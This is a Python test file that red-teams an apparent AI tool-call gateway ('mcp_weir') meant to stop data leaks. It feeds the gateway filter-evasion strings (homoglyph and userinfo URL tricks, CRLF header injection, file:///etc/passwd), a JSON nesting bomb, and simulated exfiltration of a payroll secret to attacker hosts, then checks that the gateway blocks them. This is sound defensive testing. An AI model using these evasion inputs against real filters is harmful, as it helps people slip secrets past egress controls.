"""Implementation-level red-team: hostile input to the parsers, the gateway pipeline, concurrency and the database.

These were written to break the implementation (and a few did). Design-level gaps (what the heuristic cannot see) are not
here: they are measured in docs/evaluation.md and documented in docs/red-team.md.
"""

import asyncio
import contextlib
import json
import sqlite3
import threading

import pytest
from helpers import FIXTURE, SECRET, make_gateway, run
from hypothesis import HealthCheck, given, settings
from hypothesis import strategies as st

from mcp_weir.destinations import classify_target
from mcp_weir.gateway import Gateway
from mcp_weir.store import Store, canonical
from weir_testbed.servers import in_process_upstreams
from weir_testbed.world import World

D = ["corp.example"]
EVIL = "attacker@evil.example"


# ------------------------------------------------------------------------------------------------ parsers
@pytest.mark.parametrize(
    "addr",
    [
        f'"lee@corp.example" <{EVIL}>',  # an internal address in the display name, the real one outside
        f"lee@corp.example,{EVIL}",
        f"lee@corp.example;{EVIL}",
        f"{EVIL}, lee@corp.example",
        "lee@corp.exаmple",  # Cyrillic 'а': IDNA turns it into an xn-- host, which is not internal
        "lee@corp.example.evil.example",
        "lee@@corp.example",
        '"a@corp.example"@evil.example',  # quoted local part containing an @
        "lee@corp.example\r\nBcc: " + EVIL,  # header injection
        "lee@corp.example\x00@evil.example",
        "lee@[127.0.0.1]",
        "lee@corp.example <" + EVIL + ">",
        "<" + EVIL + "> lee@corp.example",
        "lee%40corp.example@evil.example",
        "lee@corp.example@",
        " ",
        "@corp.example",
        "lee@",
    ],
)
def test_hostile_recipients_are_external(addr):
    assert classify_target("email", addr, D).external, addr


@pytest.mark.parametrize(
    "url",
    [
        "http://corp.example:80@evil.example/",
        "https://evil.example\\.corp.example/",
        "https://corp.example%2f@evil.example/",
        "https://corp.example%00.evil.example/",
        "http://0x7f000001/",
        "http://2130706433/",
        "https://[::ffff:127.0.0.1]/",
        "https://corp.example.:443@evil.example",
        "javascript:alert(1)",
        "data:text/html,hello",
        "file:///etc/passwd",
        "mailto:lee@corp.example",
        "https:corp.example",
        "https:///corp.example",
        "https://․evil.example",
        "https://corp.example\n.evil.example/",
        "https://corp.example\t.evil.example/",
        "  https://evil.example  ",
        "HTTPS://EVIL.EXAMPLE",
    ],
)
def test_hostile_urls_are_external(url):
    assert classify_target("url", url, D).external, url


def test_legitimate_variants_are_not_false_positives():
    for a in ("LEE@CORP.EXAMPLE", "lee@corp.example.", "Lee <lee@corp.example>", "a@b.c.corp.example"):
        assert classify_target("email", a, D).kind == "internal", a
    for u in ("https://CORP.EXAMPLE/x", "http://wiki.corp.example:8080/a?b=1", "https://corp.example./x"):
        assert classify_target("url", u, D).kind == "internal", u


@settings(max_examples=300, deadline=None, suppress_health_check=[HealthCheck.too_slow])
@given(
    st.one_of(
        st.text(max_size=80),
        st.binary(max_size=40),
        st.integers(),
        st.none(),
        st.lists(st.text(max_size=20), max_size=5),
    )
)
def test_classification_never_raises_and_never_calls_garbage_internal(value):
    for kind in ("email", "url", "path", "other"):
        d = classify_target(kind, value, D)
        if kind in ("email", "url") and d.kind == "internal":
            text = value if isinstance(value, str) else " ".join(value) if isinstance(value, list) else ""
            assert "corp.example" in text.lower(), (kind, value)


# ------------------------------------------------------------------------------------------------ pipeline fuzz
JSON = st.recursive(
    st.one_of(st.none(), st.booleans(), st.integers(), st.floats(allow_nan=False), st.text(max_size=40)),
    lambda c: st.one_of(st.lists(c, max_size=4), st.dictionaries(st.text(max_size=8), c, max_size=4)),
    max_leaves=12,
)


@settings(
    max_examples=150, deadline=None, suppress_health_check=[HealthCheck.too_slow, HealthCheck.function_scoped_fixture]
)
@given(
    st.sampled_from(
        ["mail__send_message", "files__read_file", "web__fetch_url", "notes__publish_note", "shell__run", "", "x__y"]
    ),
    st.one_of(
        JSON,
        st.dictionaries(
            st.sampled_from(["to", "subject", "body", "path", "url", "title", "content", "id"]), JSON, max_size=4
        ),
    ),
)
def test_fuzzed_calls_never_crash_the_gateway_and_undeclared_tools_never_run(policy, tool, args):
    w = World.from_fixture(FIXTURE)
    gw = Gateway(policy, Store(":memory:"), in_process_upstreams(w))
    run(gw.start())

    async def go():
        s = gw.open_session()
        out = await gw.call_tool_detailed(s, tool, args)
        return out

    out = run(go())
    assert isinstance(out.result.get("content"), list) and isinstance(out.result.get("isError"), bool)
    if not isinstance(args, dict):
        assert not out.forwarded and "R-LIMIT" in out.codes
    elif tool not in {t.name for t in policy.tools}:
        assert not out.forwarded and "R-UNKNOWN" in out.codes and not w.effects


def test_deeply_nested_and_huge_arguments_are_refused_not_fatal(policy):
    w = World.from_fixture(FIXTURE)
    gw = Gateway(policy, Store(":memory:"), in_process_upstreams(w))
    run(gw.start())
    nested: object = "x"
    for _ in range(200_000):  # far deeper than any recursion limit
        nested = [nested]

    async def go():
        s = gw.open_session()
        a = await gw.call_tool_detailed(
            s, "mail__send_message", {"to": "lee@corp.example", "subject": "s", "body": nested}
        )
        b = await gw.call_tool_detailed(
            s, "mail__send_message", {"to": "lee@corp.example", "subject": "s", "body": list(range(100000))}
        )
        c = await gw.call_tool_detailed(
            s, "mail__send_message", {"to": "lee@corp.example", "subject": "s", "body": "\x00" * 100 + "ok"}
        )
        d = await gw.call_tool_detailed(
            s, "mail__send_message", {"to": "lee@corp.example", "subject": "s", "body": float("inf")}
        )
        return a, b, c, d

    a, b, c, d = run(go())
    assert not a.forwarded and a.codes == ["R-LIMIT"]  # refused with a reason, no crash
    assert not b.forwarded and b.codes == ["R-LIMIT"]
    assert c.forwarded  # control characters are data, not an error
    assert d.forwarded or d.codes  # a non-finite number is either passed through or refused, never fatal


def test_a_message_nested_deeper_than_the_decoder_can_handle_does_not_kill_the_server(policy):
    from mcp_weir.server import serve

    w = World.from_fixture(FIXTURE)
    gw = Gateway(policy, Store(":memory:"), in_process_upstreams(w))
    run(gw.start())
    bomb = (
        b'{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"x","arguments":'
        + b"[" * 400_000
        + b"]" * 400_000
        + b"}}\n"
    )
    lines = [(bomb, False), (b'{"jsonrpc":"2.0","id":2,"method":"ping"}\n', False), (b"", False)]
    out = []

    async def read_line():
        if len(lines) == 1:
            await asyncio.sleep(0.2)  # let the in-flight ping finish before EOF
        return lines.pop(0)

    async def write_line(data):
        out.append(json.loads(data))

    async def go():
        await serve(gw, gw.open_session(), read_line, write_line)

    run(go())
    assert out[0]["error"]["code"] == -32700 and out[1] == {"jsonrpc": "2.0", "id": 2, "result": {}}


def test_tool_names_with_odd_characters_are_just_unknown(gw, world):
    async def go():
        s = gw.open_session()
        return [
            await gw.call_tool_detailed(s, n, {})
            for n in (
                "mail__send_message ",
                "MAIL__SEND_MESSAGE",
                "mail__send_message\x00",
                "mail/../files__read_file",
                "a" * 5000,
            )
        ]

    assert all("R-UNKNOWN" in o.codes and not o.forwarded for o in run(go()))
    assert not world.effects


# ------------------------------------------------------------------------------------------------ concurrency
def test_only_one_of_many_identical_calls_uses_a_single_approval(policy, store, world):
    gw = make_gateway(policy, store, world)
    run(gw.start())
    leak = {"to": "jo@partner.example", "subject": "s", "body": "hello partner"}
    policy2 = policy.with_rules(gate_egress="approve")
    gw = make_gateway(policy2, store, world)
    run(gw.start())

    async def go():
        s = gw.open_session()
        first = await gw.call_tool_detailed(s, "mail__send_message", leak)
        store.resolve_approval(first.approval_id, True)
        outs = await asyncio.gather(*[gw.call_tool_detailed(s, "mail__send_message", leak) for _ in range(8)])
        return outs

    outs = run(go())
    assert sum(o.forwarded for o in outs) == 1 and world.sent == 1


def test_many_concurrent_sessions_on_one_database_do_not_mix_state(policy, tmp_path):
    path = str(tmp_path / "multi.db")
    st = Store(path)
    w = World.from_fixture(FIXTURE)
    gw = make_gateway(policy, st, w)
    run(gw.start())

    async def go():
        sessions = [gw.open_session(f"s{i}") for i in range(10)]

        async def work(i, s):
            if i % 2:
                await gw.call_tool_detailed(s, "mail__read_message", {"id": "m1"})  # odd sessions see untrusted data
            return await gw.call_tool_detailed(s, "files__read_file", {"path": "/secrets/payroll.txt"})

        return await asyncio.gather(*[work(i, s) for i, s in enumerate(sessions)])

    outs = run(go())
    assert [o.forwarded for o in outs] == [
        i % 2 == 0 for i in range(10)
    ]  # only the clean sessions could read the secret
    assert st.verify_chain()[0]


def test_two_gateway_processes_sharing_a_database_keep_the_chain_valid(policy, tmp_path):
    path = str(tmp_path / "shared.db")
    errors = []

    def worker(n):
        try:
            st = Store(path)
            gw = make_gateway(policy, st, World.from_fixture(FIXTURE))
            asyncio.run(gw.start())

            async def go():
                s = gw.open_session(f"w{n}")
                for _ in range(15):
                    await gw.call_tool_detailed(s, "files__read_file", {"path": "/docs/q3.txt"})

            asyncio.run(go())
        except Exception as e:
            errors.append(repr(e))

    ts = [threading.Thread(target=worker, args=(i,)) for i in range(8)]
    [t.start() for t in ts]
    [t.join() for t in ts]
    assert not errors, errors
    ok, _bad, n = Store(path).verify_chain()
    assert ok and n >= 8 * 15 * 2


# ------------------------------------------------------------------------------------------------ cross-session
def test_a_secret_seen_in_one_session_is_not_tracked_in_another(gw, world):
    async def go():
        a, b = gw.open_session("a"), gw.open_session("b")
        await gw.call_tool_detailed(a, "files__read_file", {"path": "/secrets/payroll.txt"})
        return await gw.call_tool_detailed(
            b, "mail__send_message", {"to": "jo@partner.example", "subject": "s", "body": SECRET}
        )

    out = run(go())
    assert out.forwarded and not out.codes  # session b never saw the secret; Weir does not know it is one


# ------------------------------------------------------------------------------------------------ secrets at rest
def test_no_plaintext_secret_anywhere_in_the_database_files(policy, tmp_path):
    path = str(tmp_path / "rest.db")
    st = Store(path)
    w = World.from_fixture(FIXTURE)
    gw = make_gateway(policy, st, w, approver=lambda ap: True)
    run(gw.start())

    async def go():
        s = gw.open_session("rest")
        await gw.call_tool_detailed(s, "mail__read_message", {"id": "m1"})
        await gw.call_tool_detailed(s, "files__read_file", {"path": "/secrets/payroll.txt"})
        await gw.call_tool_detailed(
            s, "mail__send_message", {"to": "verify@evil.example", "subject": "k", "body": SECRET}
        )
        await gw.call_tool_detailed(s, "notes__publish_note", {"title": "t", "body": "sk_live_9fA3xQ72LmZ8"})

    run(go())
    st.close()
    blob = b""
    for suffix in ("", "-wal", "-shm"):
        with contextlib.suppress(FileNotFoundError), open(path + suffix, "rb") as f:
            blob += f.read()
    dump = "\n".join(sqlite3.connect(path).iterdump())
    for needle in ("sk_live_9fA3xQ72LmZ8", "9fA3xQ72LmZ8", "PAYROLL_API_KEY=sk_live"):
        assert needle.encode() not in blob and needle not in dump, needle
    assert json.loads(canonical({"ok": True}))["ok"]
